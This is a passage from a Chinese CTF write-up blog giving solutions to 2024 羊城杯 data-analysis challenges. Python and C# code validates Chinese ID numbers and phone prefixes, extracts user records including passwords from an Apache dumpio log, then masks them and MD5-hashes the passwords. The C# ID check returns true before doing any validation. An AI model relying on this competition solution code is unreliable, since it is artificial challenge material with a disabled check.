<span class="hljs-number">772</span>,<br>       <span class="hljs-number">778</span>, <span class="hljs-number">782</span>, <span class="hljs-number">783</span>, <span class="hljs-number">784</span>, <span class="hljs-number">787</span>, <span class="hljs-number">788</span>, <span class="hljs-number">795</span>, <span class="hljs-number">798</span>, <span class="hljs-number">730</span>, <span class="hljs-number">731</span>, <span class="hljs-number">732</span>, <span class="hljs-number">740</span>, <span class="hljs-number">745</span>, <span class="hljs-number">746</span>, <span class="hljs-number">755</span>,<br>       <span class="hljs-number">756</span>, <span class="hljs-number">766</span>, <span class="hljs-number">767</span>, <span class="hljs-number">771</span>, <span class="hljs-number">775</span>, <span class="hljs-number">776</span>, <span class="hljs-number">785</span>, <span class="hljs-number">786</span>, <span class="hljs-number">796</span>, <span class="hljs-number">733</span>, <span class="hljs-number">749</span>, <span class="hljs-number">753</span>, <span class="hljs-number">773</span>, <span class="hljs-number">774</span>, <span class="hljs-number">777</span>,<br>       <span class="hljs-number">780</span>, <span class="hljs-number">781</span>, <span class="hljs-number">789</span>, <span class="hljs-number">790</span>, <span class="hljs-number">791</span>, <span class="hljs-number">793</span>, <span class="hljs-number">799</span>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">validate_data</span>(<span class="hljs-params">r</span>):<br>    <span class="hljs-keyword">return</span> (is_usr(r[<span class="hljs-number">0</span>]) <span class="hljs-keyword">and</span> is_nm(r[<span class="hljs-number">1</span>]) <span class="hljs-keyword">and</span> is_sex(r[<span class="hljs-number">2</span>], r[<span class="hljs-number">4</span>]) <span class="hljs-keyword">and</span> <br>            is_brth(r[<span class="hljs-number">3</span>], r[<span class="hljs-number">4</span>]) <span class="hljs-keyword">and</span> is_id(r[<span class="hljs-number">4</span>]) <span class="hljs-keyword">and</span> is_phn(r[<span class="hljs-number">5</span>]))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_line</span>(<span class="hljs-params">line</span>):<br>    line = <span class="hljs-built_in">bytes</span>.fromhex(line.strip()).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    sd = re.split(<span class="hljs-string">r&#x27;(?&lt;!\\)&quot;&#x27;</span>, line)<br>    <span class="hljs-keyword">return</span> [sd[<span class="hljs-number">3</span>], sd[<span class="hljs-number">7</span>].encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).decode(<span class="hljs-string">&#x27;unicode_escape&#x27;</span>), <br>            sd[<span class="hljs-number">11</span>].encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).decode(<span class="hljs-string">&#x27;unicode_escape&#x27;</span>), sd[<span class="hljs-number">15</span>], sd[<span class="hljs-number">19</span>], sd[<span class="hljs-number">23</span>]]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_usr</span>(<span class="hljs-params">usr</span>):<br>    <span class="hljs-keyword">return</span> usr.isalnum()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_nm</span>(<span class="hljs-params">nm</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">all</span>(<span class="hljs-string">&#x27;\u4e00&#x27;</span> &lt;= ch &lt;= <span class="hljs-string">&#x27;\u9fff&#x27;</span> <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> nm)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_sex</span>(<span class="hljs-params">sx, idc</span>):<br>    <span class="hljs-keyword">return</span> (sx == <span class="hljs-string">&quot;男&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(idc[<span class="hljs-number">16</span>]) % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>) <span class="hljs-keyword">or</span> (sx == <span class="hljs-string">&quot;女&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(idc[<span class="hljs-number">16</span>]) % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_brth</span>(<span class="hljs-params">brth, idc</span>):<br>    <span class="hljs-keyword">return</span> brth == idc[<span class="hljs-number">6</span>:<span class="hljs-number">14</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_id</span>(<span class="hljs-params">idc</span>):<br>    chk_sum = <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">int</span>(d) * w <span class="hljs-keyword">for</span> d, w <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(idc[:<span class="hljs-number">17</span>], wgt))<br>    <span class="hljs-keyword">return</span> chk[chk_sum % <span class="hljs-number">11</span>] == idc[<span class="hljs-number">17</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_phn</span>(<span class="hljs-params">phn</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(phn[:<span class="hljs-number">3</span>]) <span class="hljs-keyword">in</span> prf<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    rslt = []<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;data.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        rslt = [process_line(line) <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f]<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;2.csv&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>, newline=<span class="hljs-string">&quot;&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        wrt = csv.writer(f)<br>        wrt.writerow([<span class="hljs-string">&#x27;usr&#x27;</span>, <span class="hljs-string">&#x27;nm&#x27;</span>, <span class="hljs-string">&#x27;sx&#x27;</span>, <span class="hljs-string">&#x27;brth&#x27;</span>, <span class="hljs-string">&#x27;idc&#x27;</span>, <span class="hljs-string">&#x27;phn&#x27;</span>])<br>        wrt.writerows(r <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> rslt <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> validate_data(r))<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Data written successfully&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>

<h3 id="data-analy3"><a href="#data-analy3" class="headerlink" title="data-analy3"></a>data-analy3</h3><p>Talk is cheap, show me your code</p>
<p><del>(永远的 C#！Python 什么的都是渣渣)</del></p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">using</span> System.Text;<br><span class="hljs-keyword">using</span> System.Text.Encodings.Web;<br><span class="hljs-keyword">using</span> System.Text.RegularExpressions;<br><span class="hljs-keyword">using</span> System.Web;<br>List&lt;<span class="hljs-built_in">string</span>&gt; validPhoneStart = [<br>    <span class="hljs-string">&quot;734&quot;</span>,<span class="hljs-string">&quot;735&quot;</span>,<span class="hljs-string">&quot;736&quot;</span>,<span class="hljs-string">&quot;737&quot;</span>,<span class="hljs-string">&quot;738&quot;</span>,<span class="hljs-string">&quot;739&quot;</span>,<span class="hljs-string">&quot;747&quot;</span>,<span class="hljs-string">&quot;748&quot;</span>,<span class="hljs-string">&quot;750&quot;</span>,<span class="hljs-string">&quot;751&quot;</span>,<span class="hljs-string">&quot;752&quot;</span>,<span class="hljs-string">&quot;757&quot;</span>,<span class="hljs-string">&quot;758&quot;</span>,<span class="hljs-string">&quot;759&quot;</span>,<span class="hljs-string">&quot;772&quot;</span>,<br>    <span class="hljs-string">&quot;778&quot;</span>,<span class="hljs-string">&quot;782&quot;</span>,<span class="hljs-string">&quot;783&quot;</span>,<span class="hljs-string">&quot;784&quot;</span>,<span class="hljs-string">&quot;787&quot;</span>,<span class="hljs-string">&quot;788&quot;</span>,<span class="hljs-string">&quot;795&quot;</span>,<span class="hljs-string">&quot;798&quot;</span>,<span class="hljs-string">&quot;730&quot;</span>,<span class="hljs-string">&quot;731&quot;</span>,<span class="hljs-string">&quot;732&quot;</span>,<span class="hljs-string">&quot;740&quot;</span>,<span class="hljs-string">&quot;745&quot;</span>,<span class="hljs-string">&quot;746&quot;</span>,<span class="hljs-string">&quot;755&quot;</span>,<br>    <span class="hljs-string">&quot;756&quot;</span>,<span class="hljs-string">&quot;766&quot;</span>,<span class="hljs-string">&quot;767&quot;</span>,<span class="hljs-string">&quot;771&quot;</span>,<span class="hljs-string">&quot;775&quot;</span>,<span class="hljs-string">&quot;776&quot;</span>,<span class="hljs-string">&quot;785&quot;</span>,<span class="hljs-string">&quot;786&quot;</span>,<span class="hljs-string">&quot;796&quot;</span>,<span class="hljs-string">&quot;733&quot;</span>,<span class="hljs-string">&quot;749&quot;</span>,<span class="hljs-string">&quot;753&quot;</span>,<span class="hljs-string">&quot;773&quot;</span>,<span class="hljs-string">&quot;774&quot;</span>,<span class="hljs-string">&quot;777&quot;</span>,<br>    <span class="hljs-string">&quot;780&quot;</span>,<span class="hljs-string">&quot;781&quot;</span>,<span class="hljs-string">&quot;789&quot;</span>,<span class="hljs-string">&quot;790&quot;</span>,<span class="hljs-string">&quot;791&quot;</span>,<span class="hljs-string">&quot;793&quot;</span>,<span class="hljs-string">&quot;799&quot;</span><br>];<br><br><span class="hljs-keyword">var</span> pattern =<br>    <span class="hljs-string">@&quot;dumpio_in \(data-HEAP\): username=(.*?)&amp;name=(.*?)&amp;idcard=(.*?)&amp;phone=(.*?)\n.*\n.*\n.*\n.*\n.*\n.*?\(data-HEAP\): (?:(.*?)\: (.*?)|(.*?))?\\n&quot;</span>;<br><span class="hljs-keyword">var</span> contents = File.ReadAllText(<span class="hljs-string">@&quot;C:\Users\yushi\Downloads\tempdir\DS附件\附件\apache2\error.log&quot;</span>);<br><span class="hljs-keyword">var</span> matches = Regex.Matches(contents, pattern);<br><span class="hljs-keyword">var</span> users = matches<br>    .ToList().Select(t =&gt;<br>        <span class="hljs-keyword">new</span> UserInfo<br>        &#123;<br>            UserName = HttpUtility.UrlDecode(t.Groups[<span class="hljs-number">1</span>].Value),<br>            <span class="hljs-comment">// url decode name</span><br>            Name = HttpUtility.UrlDecode(t.Groups[<span class="hljs-number">2</span>].Value),<br>            Phone = HttpUtility.UrlDecode(t.Groups[<span class="hljs-number">4</span>].Value),<br>            IdCard = HttpUtility.UrlDecode(t.Groups[<span class="hljs-number">3</span>].Value),<br>            Password = HttpUtility.UrlDecode(t.Groups[<span class="hljs-number">6</span>].Value),<br>            Type = Encoding.UTF8.GetString(Convert.FromHexString(<br>                (<span class="hljs-built_in">string</span>.IsNullOrEmpty(t.Groups[<span class="hljs-number">5</span>].Value) ? t.Groups[<span class="hljs-number">7</span>].Value : t.Groups[<span class="hljs-number">5</span>].Value)<br>                .Replace(<span class="hljs-string">&quot;\\x&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>                .Replace(<span class="hljs-string">&quot;\\n&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>                .Replace(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>                .Replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>            )),<br>            Raw = t.Value<br>        &#125;).ToList();<br><br><span class="hljs-keyword">var</span> originalUsers = users.Where(t =&gt; t.Type.Contains(<span class="hljs-string">&quot;录入&quot;</span>)).ToDictionary(t =&gt; t.UserName, t =&gt; t);<br><span class="hljs-keyword">var</span> modifyUsers = users.Where(t =&gt; t.Type.Contains(<span class="hljs-string">&quot;更新&quot;</span>)).ToList();<br><span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">var</span> user <span class="hljs-keyword">in</span> modifyUsers)<br>&#123;<br>    originalUsers[user.UserName] = user;<br>&#125;<br><br><span class="hljs-keyword">var</span> validUsers = originalUsers.Values.Where(CheckUser).ToList();<br><br><span class="hljs-comment">// 数据脱敏</span><br><span class="hljs-keyword">var</span> sb = <span class="hljs-keyword">new</span> StringBuilder();<br>sb.AppendLine(<span class="hljs-string">&quot;username,password,name,idcard,phone&quot;</span>);<br><span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">var</span> user <span class="hljs-keyword">in</span> validUsers)<br>&#123;<br>    sb.AppendLine(<span class="hljs-string">$&quot;<span class="hljs-subst">&#123;MaskUserName(user.UserName)&#125;</span>,<span class="hljs-subst">&#123;Md5Password(user.Password)&#125;</span>,<span class="hljs-subst">&#123;MaskName(user.Name)&#125;</span>,<span class="hljs-subst">&#123;MaskIdCard(user.IdCard)&#125;</span>,<span class="hljs-subst">&#123;MaskPhone(user.Phone)&#125;</span>&quot;</span>);<br>    <span class="hljs-comment">// sb.AppendLine($&quot;&#123;user.UserName&#125;,&#123;user.Password&#125;,&#123;user.Name&#125;,&#123;user.IdCard&#125;,&#123;user.Phone&#125;&quot;);</span><br>&#125;<br><br>File.WriteAllText(<span class="hljs-string">&quot;output.csv&quot;</span>, sb.ToString());<br><br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">MaskUserName</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> userName</span>)</span><br>&#123;<br>    <span class="hljs-comment">// 若只有两个字符则只对最后⼀位使⽤ * 号代替，否则只保留第⼀位和最后⼀位字符，其余都⽤ * 号代替，例如“ab”脱敏后就是“a*”，“abcde”脱敏后就是“a***e”。</span><br>    <span class="hljs-keyword">if</span> (userName.Length == <span class="hljs-number">2</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> userName[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot;*&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> userName[<span class="hljs-number">0</span>] + <span class="hljs-keyword">new</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">&#x27;*&#x27;</span>, userName.Length - <span class="hljs-number">2</span>) + userName[^<span class="hljs-number">1</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">Md5Password</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> password</span>)</span><br>&#123;<br>    <span class="hljs-keyword">using</span> <span class="hljs-keyword">var</span> md5 = System.Security.Cryptography.MD5.Create();<br>    <span class="hljs-keyword">var</span> inputBytes = Encoding.UTF8.GetBytes(password);<br>    <span class="hljs-keyword">var</span> hashBytes = md5.ComputeHash(inputBytes);<br>    <span class="hljs-keyword">var</span> sb = <span class="hljs-keyword">new</span> StringBuilder();<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">var</span> t <span class="hljs-keyword">in</span> hashBytes)<br>    &#123;<br>        sb.Append(t.ToString(<span class="hljs-string">&quot;x2&quot;</span>));<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> sb.ToString();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">MaskName</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> userName</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (userName.Length == <span class="hljs-number">2</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> userName[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot;*&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> userName[<span class="hljs-number">0</span>] + <span class="hljs-keyword">new</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">&#x27;*&#x27;</span>, userName.Length - <span class="hljs-number">2</span>) + userName[^<span class="hljs-number">1</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">MaskPhone</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> phone</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> phone.Substring(<span class="hljs-number">0</span>, <span class="hljs-number">3</span>) + <span class="hljs-string">&quot;****&quot;</span> + phone[<span class="hljs-number">7.</span>.];<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">MaskIdCard</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> idCard</span>)</span><br>&#123;<br>    <span class="hljs-comment">// 只保留年份</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;******&quot;</span> + idCard.Substring(<span class="hljs-number">6</span>, <span class="hljs-number">4</span>) + <span class="hljs-string">&quot;********&quot;</span>;<br>&#125;<br><br>Console.ReadLine();<br><br><span class="hljs-function"><span class="hljs-built_in">bool</span> <span class="hljs-title">CheckUser</span>(<span class="hljs-params">UserInfo info</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> CheckUserName(info.UserName) &amp;&amp; CheckName(info.Name) &amp;&amp; CheckPhone(info.Phone) &amp;&amp; CheckIDCard(info.IdCard);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">bool</span> <span class="hljs-title">CheckUserName</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> userName</span>)</span><br>&#123;<br>    <span class="hljs-comment">// should all be number and alphabet</span><br>    <span class="hljs-keyword">return</span> Regex.IsMatch(userName, <span class="hljs-string">&quot;^[A-Za-z0-9]+$&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">bool</span> <span class="hljs-title">CheckPhone</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> phone</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (phone.Length != <span class="hljs-number">11</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// should all be number</span><br>    <span class="hljs-keyword">if</span> (!Regex.IsMatch(phone, <span class="hljs-string">&quot;^[0-9]+$&quot;</span>))<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> validPhoneStart.Contains(phone.Substring(<span class="hljs-number">0</span>, <span class="hljs-number">3</span>));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">bool</span> <span class="hljs-title">CheckName</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> name</span>)</span><br>&#123;<br>    <span class="hljs-comment">// should all be chinese</span><br>    <span class="hljs-keyword">return</span> Regex.IsMatch(name, <span class="hljs-string">&quot;^[\u4e00-\u9fa5]+$&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">bool</span> <span class="hljs-title">CheckIDCard</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> idNumber</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">if</span> (idNumber.Length == <span class="hljs-number">18</span>)<br>    &#123;<br>        <span class="hljs-built_in">bool</span> check = CheckIDCard18(idNumber);<br>        <span class="hljs-keyword">return</span> check;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-built_in">bool</span> <span class="hljs-title">CheckIDCard18</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> idNumber</span>)</span><br>&#123;<br>    <span class="hljs-built_in">long</span> n = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">long</span>.TryParse(idNumber.Remove(<span class="hljs-number">17</span>), <span class="hljs-keyword">out</span> n) == <span class="hljs-literal">false</span><br>        || n &lt; Math.Pow(<span class="hljs-number">10</span>, <span class="hljs-number">16</span>) || <span class="hljs-built_in">long</span>.TryParse(idNumber.Replace(<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>).Replace(<span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>), <span class="hljs-keyword">out</span> n) == <span class="hljs-literal">false</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">//数字验证  </span><br>    &#125;<br>    <br>    <span class="hljs-built_in">string</span>[] arrVarifyCode = (<span class="hljs-string">&quot;1,0,x,9,8,7,6,5,4,3,2&quot;</span>).Split(<span class="hljs-string">&#x27;,&#x27;</span>);<br>    <span class="hljs-built_in">string</span>[] Wi = (<span class="hljs-string">&quot;7,9,10,5,8,4,2,1,6,3,7,9,10,5,8,4,2&quot;</span>).Split(<span class="hljs-string">&#x27;,&#x27;</span>);<br>    <span class="hljs-built_in">char</span>[] Ai = idNumber.Remove(<span class="hljs-number">17</span>).ToCharArray();<br>    <span class="hljs-built_in">int</span> sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">17</span>; i++)<br>    &#123;<br>        sum += <span class="hljs-built_in">int</span>.Parse(Wi[i]) * <span class="hljs-built_in">int</span>.Parse(Ai[i].ToString());<br>    &#125;<br><br>    <span class="hljs-built_in">int</span> y = <span class="hljs-number">-1</span>;<br>    Math.DivRem(sum, <span class="hljs-number">11</span>, <span class="hljs-keyword">out</span> y);<br>    <span class="hljs-keyword">if</span> (arrVarifyCode[y] != idNumber.Substring(<span class="hljs-number">17</span>, <span class="hljs-number">1</span>).ToLower())<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">//校验码验证  </span><br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">//符合GB11643-1999标准  </span><br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span><br>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> UserName &#123; <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Name &#123; <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Phone &#123; <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> IdCard &#123; <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Password &#123; <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Type &#123; <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Raw &#123; <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; &#125;<br>&#125;<br></code></pre></td></tr></table></figure>


                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/wp/" class="category-chain-item">wp</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/ctf/" class="print-no-link">#ctf</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>2024羊城杯WP</div>
      <div>https://fyhypo.github.io/blog/wp/2024羊城杯WP/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>FYHypo</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年9月1日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/blog/wp/2024NepCTFWP/" title="NepCTF2024WP">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">NepCTF2024WP</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/blog/HTB/HTB%20Crafty/" title="HTB Crafty">
                        <span class="hidden-mobile">HTB Crafty</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
